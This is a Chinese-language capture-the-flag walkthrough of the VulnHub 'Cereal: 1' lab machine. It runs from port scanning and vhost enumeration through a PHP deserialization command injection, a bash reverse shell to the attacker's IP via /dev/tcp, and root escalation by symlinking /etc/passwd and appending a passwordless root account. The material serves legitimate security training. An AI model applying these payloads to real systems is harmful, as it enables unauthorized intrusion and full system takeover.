靶机地址：[Cereal: 1 ~ VulnHub](https://www.vulnhub.com/entry/cereal-1,703/)

主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- "192.168.1.51"
# PORT      STATE SERVICE
# 21/tcp    open  ftp
# 22/tcp    open  ssh
# 80/tcp    open  http
# 139/tcp   open  netbios-ssn
# 445/tcp   open  microsoft-ds
# 3306/tcp  open  mysql
# 11111/tcp open  vce
# 22222/tcp open  easyengine
# 22223/tcp open  unknown
# 33333/tcp open  dgi-serv
# 33334/tcp open  speedtrace
# 44441/tcp open  unknown
# 44444/tcp open  cognex-dataman
# 55551/tcp open  unknown
# 55555/tcp open  unknown
sudo nmap -p "21,22,80,139,445,3306,11111,22222,22223,33333,33334,44441,44444,55551,55555" -sV "192.168.1.51"
# 21/tcp    open  ftp        vsftpd 3.0.3
# 22/tcp    open  ssh        OpenSSH 8.0 (protocol 2.0)
# 80/tcp    open  http       Apache httpd 2.4.37 (())
# 139/tcp   open  tcpwrapped # 识别失败
# 445/tcp   open  tcpwrapped # 识别失败
# 3306/tcp  open  mysql?
# 11111/tcp open  tcpwrapped # 识别失败
# 22222/tcp open  tcpwrapped # 识别失败
# 22223/tcp open  tcpwrapped # 识别失败
# 33333/tcp open  tcpwrapped # 识别失败
# 33334/tcp open  tcpwrapped # 识别失败
# 44441/tcp open  http       Apache httpd 2.4.37 (())
# 44444/tcp open  tcpwrapped # 识别失败
# 55551/tcp open  tcpwrapped # 识别失败
# 55555/tcp open  tcpwrapped # 识别失败
```

逐个尝试 先试一下FTP
```Shell
searchsploit vsftpd 3.0.3
# 只有一个拒绝服务攻击的 对渗透没什么帮助

# 尝试匿名登录
ftp 192.168.1.51
# Name: anonymous
# Password:
# 登录成功 但是无法下载文件
```

访问80的服务端口看看，像是一个Apache的测试页面，没什么特别的，路径扫描一下
```Shell
sudo dirsearch -u "http://192.168.1.51"
# /admin/
# /phpinfo.php
# /blog/
```
发现有些内容不能正确加载，修改hosts文件
```Shell
# cereal.ctf
192.168.1.51    cereal.ctf
```
没啥用，还是加载不了，最后发现是代理没关。。。吐了，下次要注意
```Shell
sudo dirsearch -u "http://cereal.ctf/blog/"
# /blog/wp-admin
```
是WordPress网站，没发现啥其它特别的，再看看44441端口
```Shell
sudo dirsearch -u "http://cereal.ctf:44441"
```
还是没什么发现，查了一下，需要子域名枚举
```Shell
gobuster vhost -u http://cereal.ctf:44441 --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
# Found: secure.cereal.ctf:44441
```
把这个域名也绑定上，访问看看，是ping指令的参数
尝试命令注入，失败了
拦截请求看看，参数如下
```
obj=O%3A8%3A%22pingTest%22%3A1%3A%7Bs%3A9%3A%22ipAddress%22%3Bs%3A9%3A%22127.0.0.1%22%3B%7D&ip=127.0.0.1
```
即
```
O:8:"pingTest":1:{s:9:"ipAddress";s:9:"127.0.0.1";}
127.0.0.1
```
上面的参数指定反序列化的类型，可能存在不安全的反序列化漏洞
想要利用，还需要知道一些源码，找到可以利用的类型，结合之前页面上的信息，找一些备份文件
```Shell
sudo ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://secure.cereal.ctf:44441/FUZZ
# back_en                 [Status: 301, Size: 247, Words: 14, Lines: 8, Duration: 22ms]
```
发现一个 `403 Forbidden` 的目录，对其进行进一步扫描
```Shell
gobuster dir -u http://secure.cereal.ctf:44441/back_en/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x bak
# /index.php.bak        (Status: 200) [Size: 1814]
```
查看一下源码
```Shell
curl http://secure.cereal.ctf:44441/back_en/index.php.bak
```
内容如下
```php
<?php

class pingTest {
        public $ipAddress = "127.0.0.1";
        public $isValid = False;
        public $output = "";

        function validate() {
                if (!$this->isValid) {
                        if (filter_var($this->ipAddress, FILTER_VALIDATE_IP))
                        {
                                $this->isValid = True;
                        }
                }
                $this->ping();

        }

        public function ping()
        {
                if ($this->isValid) {
                        $this->output = shell_exec("ping -c 3 $this->ipAddress");
                }
        }

}

if (isset($_POST['obj'])) {
        $pingTest = unserialize(urldecode($_POST['obj']));
} else {
        $pingTest = new pingTest;
}

$pingTest->validate();

// ...
?>
```
查看源码可以得知，需要将 `isValid` 置为 `true` ，才可以跳过检测
写一段php代码生成负载
```php
<?php
class pingTest {
        public $ipAddress = "127.0.0.1";
        public $isValid = True;
}

$obj = new pingTest();
echo serialize($obj);
echo "\n";
echo urlencode(serialize($obj));
echo "\n";
?>
```
这样的话可以通过修改 `ipAddress` 进行命令注入
```
127.0.0.1;id
```
成功了，进一步利用
```
127.0.0.1;which nc;which python2;which python3;
```
一个都没有，只能直接通过bash反弹shell
```
127.0.0.1;bash -i >& /dev/tcp/192.168.1.26/4444 0>&1;
```
成功获取到了反弹shell
交互升级
```Shell
SHELL=bash script -q /dev/null
```
提权
```Shell
uname -a
# Linux cereal.ctf 4.18.0-240.22.1.el8.x86_64 #1 SMP Mon Apr 12 04:29:16 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
ls -l /etc/passwd
# -rwxrwxr-x. 1 root root 1549 May 29  2021 /etc/passwd
# 属组有权限 很明显不同寻常

wget http://192.168.1.26:7331/pspy64
chmod +x pspy64
./pspy64
# /bin/bash /usr/share/scripts/chown.sh
```
过了一会儿发现一个可以进程，查看一下
```Shell
cat /usr/share/scripts/chown.sh
# chown rocky:apache /home/rocky/public_html/*
```
会定期将整个目录下的文件，属主改为rocky，属组改为apache
接下来就是如何利用，更改符号链接的所有者也会更改链接文件的所有者
结合之前收集到的信息：密码文件的属组有修改权限，可以为密码文件在当前目录下建立一个软连接，然后等定时脚本执行过，属组改为当前用户apache再去修改root密码
```Shell
ln -s /etc/passwd /home/rocky/public_html/passwd
# ln -sf /etc/passwd /home/rocky/public_html/passwd
ls -l /etc/passwd
# -rwxrwxr-x. 1 root root 1549 May 29  2021 /etc/passwd
# 经过漫长的等待
ls -l /etc/passwd
# -rwxrwxr-x. 1 rocky apache 1610 Dec  7 07:43 /etc/passwd
echo "aaaabbbb::0:0:root:/root:/bin/bash" >> /etc/passwd
su aaaabbbb
```

其它提权方式：[[20 CVE#CVE-2022-2588|CVE-2022-2588]]
